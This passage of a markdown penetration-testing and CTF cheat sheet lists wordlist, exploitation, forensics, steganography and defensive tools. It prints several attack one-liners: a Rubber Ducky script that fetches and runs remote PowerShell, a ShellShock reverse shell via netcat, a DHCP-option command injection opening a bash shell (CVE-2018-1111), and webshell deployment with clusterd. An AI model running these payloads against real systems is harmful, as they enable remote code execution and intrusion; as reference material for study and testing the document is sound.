    <br> count and sort words on a site: `cewl -c http://10.0.0.3/`
    <br> collect emails: `cewl -e http://10.0.0.3/`

*   [crunch (kali)](https://tools.kali.org/password-attacks/crunch) ([RU](https://kali.tools/?p=720)) - a wordlist generator where you can specify a standard character set or a character set you specify. crunch can generate all possible combinations and permutations.
    <br> [Как создать словарь паролей используя - CRUNCH (RU)](https://h4cks4w.blogspot.ru/2015/04/crunch.html)
    
    <div class="spoiler"><div class="spoiler-title">
    <i>trivial examples</i>
    </div><div class="spoiler-text" markdown="1">
    `crunch [min_length] [max_length] [character_set] [options]` -> `crunch 8 8 0123456789 -o test.txt`

    ```
    crunch 1 1 -m cat dog pig
    catdogpig
    catpigdog
    dogpigcat
    ....
    ```
    </div>
    </div>

* [maskprocessor](https://github.com/hashcat/maskprocessor) - high-performance word generator with a per-position configureable charset
* [(RU) cоздание и нормализация словарей](https://habrahabr.ru/company/pentestit/blog/337718/)
*   Custom script for web-page words extraction:

    <div class="spoiler"><div class="spoiler-title">
    <i>parse web-page and generate wordlist for further bruteforce (python3)</i>
    </div><div class="spoiler-text" markdown="1">

    ``` python
    #!/usr/bin/python3
    # ./parser.py http://10.0.0.3/index.html index.txt

    import re
    import requests
    import sys

    def repl(txt):
        txt = txt.replace('<!', ' ').replace('>', ' ').replace('</', ' ').replace('\n', ' ').replace('<', ' ').replace('"', ' ').replace('=', ' ').replace(':', ' ').replace('--', ' ').replace('/', ' ').replace("'", " ").replace('©', ' ').replace(',', ' ').replace('#', ' ').replace('→a', ' ').replace('?', ' ').replace('.', ' ').replace(';', ' ').replace('(', ' ').replace(')', ' ').replace('{', ' ').replace('}', ' ')
        return txt.strip()

    words = []
    url = sys.argv[1]
    req = requests.get(url).text.splitlines()
    for item in req:
        item = repl(item)
        tmp = [x.strip() for x in item.split(' ') if x.strip() != '']
        for word in tmp:
            if word not in words:
                words.append(word)

    w = open(sys.argv[2], 'w')
    for x in words:
        w.write('%s\n' %(x))
    w.close()
    ```
    </div>
    </div>

<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->

<br>

---

## Categorial/Concrete/Narrow tools/attacks

---

[Frida](http://www.frida.re/docs/home/) - dynamic code instrumentation toolkit
<br>&emsp; [Instrumenting Android Applications with Frida](http://blog.mdsec.co.uk/2015/04/instrumenting-android-applications-with.html)

* [clusterd](https://github.com/hatRiot/clusterd) (kali linux) - autoexploitation of jboss|coldfusion|weblogic|tomcat|railo|axis2|glassfish with default passwords (exploitation: loading a webshell by standart app-deploy mechanism (no hacking))
    <br> `clusterd -d -i 10.0.0.2 -p 8080 --fingerprint` - fingerprint host
    <br> `clusterd -d -i 10.0.0.2 -p 8080 --deploy /usr/share/clusterd/src/lib/resources/cmd.war` - deploy app
    <br> [web-shells used for upload](https://github.com/hatRiot/clusterd/tree/master/src/lib/resources)

Database (oracle, etc.) attacks:

* [odat](https://github.com/quentinhardy/odat) – oracle database attacking tool
* [Toad for Oracle](https://www.quest.com/products/toad-for-oracle/) (code quality assurance, automated code testing/analysis, automated performace optimization), Oracle Assessment Kit (OAK)
* [HexorBase](https://tools.kali.org/vulnerability-analysis/hexorbase) – can extract all data with known login:pass for database

[evilarc](https://github.com/ptoomey3/evilarc) - create tar/zip archives that can exploit directory traversal vulnerabilities

PDF-tools:

* [PDF analysis](https://github.com/zbetcheckin/PDF_analysis) - awesomeness
* [description](https://blog.didierstevens.com/programs/pdf-tools/): make-pdf, pdfid, pdf-parser.py, PDFTemplate.bt

SQL-browsers:

* [HiediSQL](https://www.heidisql.com/) - universal sql client (gui more-friendly) (MySQL, MSSQL and PostgreSQL browser)
* [DBeaver](https://dbeaver.jkiss.org/) - universal sql client (more functional (supports more connection types))
* [SQLiteBrowser](https://github.com/sqlitebrowser/sqlitebrowser)
* {:.dummy}[Oracle Instant Client](http://www.oracle.com/technetwork/database/database-technologies/instant-client/overview/index.html)

Hexeditors:

* ***hexdump*** – ASCII, decimal, hexadecimal, octal dump
* [HxD](https://mh-nexus.de/en/) - hexadecimal editor
* [HexEdit](http://www.hexedit.com/) (win) – hexadecimal editor
* [Hex viewers and editors](https://twitter.com/i/moments/841916822014332930)

Serialization/deserialization:

* [What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/) ([exploits (github)](https://github.com/foxglovesec/JavaUnserializeExploits)) - deserialization vulnerability for jenkins, weblogic, jboss, websphere
* [ysoserial](https://github.com/frohoff/ysoserial) - utility for generating java for exploiting deserialization vulnerabilities

<br>

Git/... (version control system) repository disembowel:
* [dvcs-ripper](https://github.com/kost/dvcs-ripper) - rip web accessible (distributed) version control systems: SVN/GIT/HG... (even when directory browsing is turned off)
    <br> `perl ~/tools/dvcs-ripper/rip-git.pl -sgvm -u http://keepass.hhcow.ru/empty/.git/`
    <br> *note*: git repositories may contain *packs* with complicated names (sha), though their names can not be guessed
* [dvcs-Pillage](https://github.com/evilpacket/DVCS-Pillage)
    <br> `./gitpillage.sh http www.example.com/subdir`
<div class="spoiler"><div class="spoiler-title" style="display: inline-block;">
<i>Manual git-repo disembowel</i>
</div><div class="spoiler-text" markdown="1">

``` bash
git init
wget http://example.com/.git/index -O .git/index
git ls-files # Listing of git files

git checkout interest-file.txt # error with file hash: 01d355b24a38cd5972d1317b9a2e7f6218e15231
wget http://example.com/.git/objects/xx/yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy -O .git/objects/xx/yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy

git checkout interest-file.txt
 # You have file
```
</div>
</div>

<br>

Attacks:

* [Invoke-PSImage](https://github.com/peewpw/Invoke-PSImage) - embeds a PowerShell script in the pixels of a PNG file and generates a oneliner to execute

Tools:

* [CCleaner](http://ccleaner.org.ua/download/) – looks into a lot of places in windows system

<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->

<br>

---

## Hardware

---

***RubberDucks*** - special usb sticks for keyboard emulation, right after inserting it into computer.

* RubberDucks can be programmed using [***DuckScript***](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Duckyscript) ([USB Rubber Ducky (github)](https://github.com/hak5darren/USB-Rubber-Ducky))

    **Setting up RubberDuck**:

    1. Create text file on DuckScript
    1. Compile DuckScript into jar file using [`duckencoder.jar`](https://github.com/hak5darren/USB-Rubber-Ducky/blob/master/duckencoder.jar) into `bin`
    1. Upload `bin` into MicroSD card into first FAT32 partition as file named `inject.bin`

    <div class="spoiler"><div class="spoiler-title" markdown="1">
    DuckScript example:
    </div><div class="spoiler-text" markdown="1">

    ```
    DELAY 2000
    GUI r
    DELAY 200
    STRING cmd /Q /D /T:78 /F:OFF /V:ON /K
    ENTER
    DELAY 750
    ALT SPACE
    STRING m
    LEFTARROW
    REPEAT 100
    ENTER
    DELAY 750
    STRING powershell.exe -nop -w hidden -c $J=new-object net.webclient;$J.proxy=[Net.WebRequest]::GetSystemWebProxy();$J.Proxy.Credentials=[Net.CredentiaLCache]::DefaultCredentials;EIX $J.downloadstring('http://10.0.0.1:8080/')
    ENTER
    ```
    </div></div>

* [Teensy USB development board](https://www.pjrc.com/teensy/)

<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->

<br>

---

# Forensic (images, raw data, broken data) (more about ctf, rather than real incident response)

---

### awesomeness

* [DFIR](http://www.dfir.training/index.php/tools/advanced-search) - digital forensics and incident response (tremendous tools list concerning forensics)

* ***[forensicswiki.org](http://forensicswiki.org/wiki/Main_Page)*** - awesomeness, web-site about forensic
    <br> [Document Metadata Extraction](http://www.forensicswiki.org/wiki/Document_Metadata_Extraction)
<!-- * [13Cubed (youtube)](https://www.youtube.com/user/davisrichardg/videos) - advanced forensics -->
* [linux-explorer](https://github.com/intezer/linux-explorer) - easy-to-use live forensics toolbox for Linux endpoints

<br>

* [https://cdn.securelist.com/files/2017/12/HappyNewYear.zip](https://cdn.securelist.com/files/2017/12/HappyNewYear.zip) - collect logs, NTFS data, entries from the Windows registry and strings from the binary files to find out how exactly the attackers were moving through the network

### file type convertions, obfuscation/deobfuscation

* `file`
* [exemsi](http://www.exemsi.com/download) - exe-to-msi convertor
* [wix](https://github.com/wixtoolset/wix3/releases/tag/wix3111rtm) - set of tools available to create your windows installation experience
    <br> `dark.exe -swall -x . sample.msi` - a tool to easily convert an MSI file into an XML file

### tools for analyzing, reverse engineering, and extracting images/files

* [WinHex](https://www.x-ways.net/winhex/) - a universal hexadecimal editor, particularly helpful in the realm of computer forensics, data recovery, low-level data processing, and IT security
* *Determine type of data*:

    * ***file*** (linux), [trid (windows)](http://mark0.net/soft-trid-e.html) - identify file types from their binary signatures
    * [File Format Identification](http://www.forensicswiki.org/wiki/File_Format_Identification)
    * [toolsley.com (online tool)](https://www.toolsley.com/file.html)
    * [***Tika*** (apache's)](http://tika.apache.org/) - a content analysis toolkit

* [***hash-identifier***](https://tools.kali.org/password-attacks/hash-identifier) (kali tool)

* Dumping data ([forensics wiki - Memory Imaging](http://www.forensicswiki.org/wiki/Tools:Memory_Imaging))

    HDD: dd, Acronis (windows)
    RAM: [LiME](https://github.com/504ensicsLabs/LiME)(linux), Goldfish(osx), [rekall](https://github.com/google/rekall) (osx/windows), [RAM capturer](http://ru.belkasoft.com/en/ram-capturer) (windows)

* *Analyse raw-data*:

    * *recover ntfs*:

        * [NTFS data recovery toolkit](http://www.ntfs.com/recovery-toolkit.htm)
        * [ntfsundelete](https://www.ntfsundelete.com/)

    * [Autopsy](https://github.com/sleuthkit/autopsy) – easy to use GUI digital forensics platform (can recover data, ...)
        <br> &emsp; ([The Sleuth Kit](https://www.sleuthkit.org/sleuthkit/) - library, used by autopsy behind the curtains)
    * [volatility](http://www.volatilityfoundation.org/releases) ([volatility (github)](https://github.com/volatilityfoundation/volatility/wiki)) - advanced memory forensics framework
        <br> [Snifer/security-cheatsheets volatility](https://github.com/Snifer/security-cheatsheets/blob/master/volatility)
        <br> example: [vmem dump of stuxnet under WinXPSP3x86](http://malwarecookbook.googlecode.com/svn/trunk/stuxnet.vmem.zip) ([at web-archive](https://web.archive.org/web/20140722004222if_/http://malwarecookbook.googlecode.com/svn/trunk/stuxnet.vmem.zip))
    * [rekall](https://github.com/google/rekall) - memory forensic framework

    * *Extract files/info from raw-data*:

        * ***binwalk*** (`-E` flag will show entropy value)
        * [extract-firmware.sh](https://github.com/mirror/firmware-mod-kit/blob/master/extract-firmware.sh)
        * [bulk-extractor](http://www.forensicswiki.org/wiki/Bulk_extractor) - extracts useful information by processing partially corrupted or compressed data (zip, pdf, gzip, ...). It can carve JPEGs, office documents and other kinds of files out of fragments of compressed data. It will detect and carve encrypted RAR files.
            <br> `bulk_extractor -o bulk-out xp-laptop-2005-07-04-1430.img` - extract files to the output directory (-o bulk-out) after analyzing the image file (xp-laptop-2005-07-04-1430.img)

    * *Restore*:

        * ***foremost*** - recover files using their headers, footers, and data structures
        * [DiskDrill](https://www.cleverfiles.com/help/) - data recovery for MacOS and Windows

* [FTK (Forensic toolkit)](http://accessdata.com/product-download/ftk-download-page)
* [FTK Imager](http://marketing.accessdata.com/ftkimager3.2.0)
* [PCredz](https://github.com/lgandx/PCredz)

<br>

### ctf forensics / steganography / cryptography

[RsaCtfTool](https://github.com/Ganapati/RsaCtfTool) - retrieve private key from weak public key and/or uncipher data

#### Audio:

* [Audacity](http://www.audacityteam.org/download/) – cross-platform audio software for multi-track recording and editing
* [mp3stego](http://www.caesum.com/handbook/stego.htm)
* [SonicVisualiser](http://www.sonicvisualiser.org/download.html) - audio forensics
* ***ffmpeg*** – video converter

#### Pictures, images:

*   [stegsolve](http://www.caesum.com/handbook/stego.htm)
*   [PIL](http://www.pythonware.com/products/pil/) - python imaging library

    <div class="spoiler"><div class="spoiler-title">
    <i>PIL example:</i>
    </div><div class="spoiler-text" markdown="1">
    
    ``` python
    import Image

    img = Image.open('image.png')
    in_pixels = list(img.getdata())
    out_pixels = list()

    for i in range(len(in_pixels)):
        r = in_pixels[i][0]
        g = in_pixels[i][1]
        b = in_pixels[i][2]
        out_pixels.append( (r^g^b, 0, 0) )

    out_img = Image.new(img.mode, img.size)
    out_img.putdata(out_pixels)
    out_img.show()
    ```
    </div>
    </div>

* [pngcheck](http://www.libpng.org/pub/png/apps/pngcheck.html) (linux) – verifies the integrity of PNG, JNG and MNG files and extracts format chuncks
* [ImageMagick](https://www.imagemagick.org/script/download.php) (linux) - create, edit, compose, or convert bitmap images

* **articles**:

    * [cheatsheet - Steganography 101](https://pequalsnp-team.github.io/cheatsheet/steganography-101)
    * [Pic_stego](http://itsecwiki.org/index.php?title=Pic_stego)

#### steganography:

* ***exiftool(–k)*** - read and write meta information in files
* ***outguess***, ***stegdetect***, [***steghide***](http://steghide.sourceforge.net/) – stegano detectors
    <br> `steghide embed -cf picture.jpg -ef secret.txt`
    <br> `steghide extract -sf picture.jpg`

<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->

<br>

---

# Defensive

---

[Zabbix Threat Control](https://github.com/vulnersCom/zabbix-threat-control) ([Zabbix как сканер безопасности](https://m.habr.com/company/vulners/blog/416137/))

[GOSINT](https://github.com/ciscocsirt/GOSINT) - Open Source Threat Intelligence Gathering and Processing Framework

[Rootkit hunter](http://rkhunter.sourceforge.net/) - security monitoring and analyzing tool for POSIX compliant systems

[fail2ban](https://www.fail2ban.org/wiki/index.php/Main_Page) - bruteforce (DoS) trivial defense

[check_ioc](https://github.com/oneoffdallas/check_ioc) - a script to check for various, selectable indicators of compromise on Windows Systems
<br> [Uncovering indicators of compromise](https://www.linuxincluded.com/uncovering-indicators-of-compromise/)

[wphardening (github)](https://github.com/elcodigok/wphardening)

[snyk.io](https://snyk.io/) - continuously find and fix vulnerabilities in your dependencies

[cure53/DOMPurify](https://github.com/cure53/DOMPurify) - XSS sanitizer for HTML, MathML and SVG

[Securing Java](http://www.securingjava.com/toc.html) ([web archive - securing java](https://web.archive.org/web/20170809210051/http://www.securingjava.com/toc.html))

[nginx config pitfalls](https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/)

[clamav](https://www.clamav.net/) - an open source antivirus engine for detecting trojans, viruses, malware & other malicious threats.

[snort](https://www.snort.org/) – network intrusion prevention system (NIPS) and network intrusion detection system (NIDS) (free and opensource)


#### Log management

* [clickhouse (yandex)](https://clickhouse.yandex/) - an open source column-oriented database management system capable of real time generation of analytical data reports using SQL queries.
* [graylog](https://www.graylog.org/) - enterprise log management for all
* [elastic elk stack](https://www.elastic.co/elk-stack)
    <br> [HELK](https://github.com/Cyb3rWard0g/HELK) - a hunting ELK (Elasticsearch, Logstash, Kibana) with advanced analytic capabilities (can be used for SIEM systems)
* [logstalgia.io](http://logstalgia.io/)
* ... and much-much more

* [molo.ch](https://molo.ch/) [molo.ch (github)](https://github.com/aol/moloch) - open source, large scale, full packet capturing, indexing, and database system
    <br> (one of the applications is to use it for SIEM systems)

#### Obfuscation

* [tigress](http://tigress.cs.arizona.edu/) – Tigress is a diversifying virtualizer/obfuscator for the C language that supports many novel defenses against both static and dynamic reverse engineering and de-virtualization attacks
* [sendmark](http://sandmark.cs.arizona.edu/) – tool for software watermarking, tamper-proofing, and code obfuscation of Java bytecode

* {:.dummy} *Revelo* – obfuscate/deobfuscate JS-code.
* {:.dummy} *PHPConverter* – obfuscate/deobfuscate PHP-code
* {:.dummy} *PHPScriptDecoder* – deobfuscator of PHP-code

#### Honeypots

* [kippo](https://github.com/desaster/kippo) - ssh honeypot
* `python -m smtpd -n -c DebuggingServer localhost:25` - smtp honeypot
* `ssh whoami.filippo.io` - ssh deanonymization
* [letmeoutofyour.net](http://letmeoutofyour.net/) - answers `w00tw00t` an all protocols

<br>

**Rolebased and mandatory access models** for Linux: ***SELinux***, ***GRSecurity***, ***AppArmor***, ...
<br> SELinux (triplet is called - *security context*):

* (subject) username -> (exists policy setting available role changes) -> role -> (role linked to several domains) -> domain/type (set of actions available to process)
* (objects) name -> role -> type
    <br> &nbsp;

* polices contains rules, how types can access each other, whether it be a domain accessing a type, or a domain accessing another domain
* *Access vector* for *class* - describes set of operations available to be done by subject under object whose type belongs to defined class (classes inheritance is available)
* *type transitions* - types can automatically change with `exec`

<br>

[BCC](https://github.com/iovisor/bcc) - tools for BPF-based Linux IO analysis, networking, monitoring, and more (effective toolkit for linux monitoring)

<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->

<br>

---

# Widely heard vulnerabilities

---

* [DirtyCow](http://dirtycow.ninja/) (CVE-2016-5195)
    <br> `searchsploit 'dirty cow'` `gcc /path/to/exploit.c -o cowroot -pthread`
* [Heartbleed](http://heartbleed.com/) (*CVE-2014-0160*) - vulnerability in OpenSSL library (heartbeat sub-protocol)
    <br> [msf module: `use auxiliary/scanner/ssl/openssl_heartbleed`](https://community.rapid7.com/community/metasploit/blog/2014/04/09/metasploits-heartbleed-scanner-module-cve-2014-0160)
* ***ShellShock / BashDoor*** (CVE-2014-6271, ...)
    <br> exploit example: `curl -A '() { :; }; /bin/nc -p 3333 -e /bin/sh' http://10.0.0.1/script`
    <br> check your system: `export evil='() { :;}; echo vulnerable'; bash -c echo;`
    <br> check cgi script: `curl -i -X HEAD "http://example.com/" -A '() { :; }; echo "Warning: Server Vulnerable"'`
* ***EternalBlue*** (CVE-2017-0144) (MS17-010) - vulnerability in SMB share (maybe microsoft's backdoor) (this vulnerability used in WannaCry)
    <br> derevatives: [MS17-010 EternalSynergy / EternalRomance / EternalChampion aux+exploit modules](https://github.com/rapid7/metasploit-framework/pull/9473)
    <br> [eternal_check](https://github.com/peterpt/eternal_check) - vulnerability check to Eternal Blue, Romance, Synergy, Champion
    <br> [Анализ шифровальщика Wana Decrypt0r 2.0](https://habr.com/company/pentestit/blog/328606/)
* ***MS12-020 - rdp DoS***: `/usr/share/exploitdb/exploits/windows/dos/18606.txt`
* [KRACK attack](https://www.krackattacks.com/) - breaking WPA2 (CVE-2017-13077 - CVE-2017-13082, CVE-2017-13084, CVE-2017-13086 - CVE-2017-13088)
* [Meltdown / SPECTRE attack](https://spectreattack.com/) - intel's hardware vulnerability (CVE-2017-5715, CVE-2017-5753, CVE-2017-5754)
    <br> [spectre check](http://xlab.tencent.com/special/spectre/spectre_check.html)
    <br> [Пошумели - разошлись. Meltdown, Spectre месяц спустя (Артём Гавриченков) (2018)](https://events.yandex.ru/lib/talks/5520/)
    <br> Defenses: KPTI (kernel page-table isolation), retpoline (more advanced: IBRS/IBPB); In browsers: rough counters (performance.now), disable SharedArrayBuffer, "Full Site Isolation", "Pointer poisoning", "Index Masking"
* CVE-2018-1111 ([POC](https://twitter.com/Barknkilic/status/996470756283486209?s=09)) - remote code injection in redhat via dhcp with root privileges
    <br> `dnsmasq --interface=eth0 --bind-interfaces  --except-interface=lo --dhcp-range=10.1.1.1,10.1.1.10,1h --conf-file=/dev/null --dhcp-option=6,10.1.1.1 --dhcp-option=3,10.1.1.1 --dhcp-option="252,x'&nc -e /bin/bash 10.1.1.1 1337`

<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->

<br>

---

# Random tools

---

[kaitai](http://kaitai.io/) - Kaitai struct - a new way to develop parsers for binary structures.

***selenium***, ***slimerjs***, ***phantomjs***, ***casperjs*** - software-testing framework for web applications - tools for browser-control

***BusyBox*** –  software that provides several stripped-down Unix tools in a single executable file

[cheat](https://github.com/chrisallenlane/cheat) - designed to help remind *nix system administrators of options for commands that they use frequently, but not frequently enough to remember
<br> [security-cheatsheets](https://github.com/Snifer/security-cheatsheets)

[TCC](https://bellard.org/tcc/) - tiny C compiler

[Виртуальные Номера (бесплатные)](http://telegra.ph/Virtualnye-Nomera-besplatnye-01-22) - list of resorces for using virtual telephone numbers (virtual phone, virtual cellphone)

[www.dtsearch.com](http://www.dtsearch.com) - product for searching through terabytes of data (files with wide variety of extensions/types)

Fun:

* [pingfs](https://github.com/yarrick/pingfs) - stores your data in ICMP ping packets
* [zcash](https://z.cash/about.html) - team trying to implement "Zerocash" protocol, based on Bitcoin's code, it intends to offer a far higher standard of privacy through a sophisticated zero-knowledge proving scheme that preserves confidentiality of transaction metadata.
    <br> serious project, in progress

## Fuzzers

* [afl](http://lcamtuf.coredump.cx/afl/) - american fuzzy lop - popular fuzzer for finding binary vulnerabilities
* [radamsa](https://github.com/aoh/radamsa) - a general-purpose fuzzer - typically used to test how well a program can withstand malformed and potentially malicious inputs

## Configuration analysis

* [lynis (sh)](https://github.com/CISOfy/lynis) - security auditing tool for Linux, macOS, and UNIX-based systems

</article>
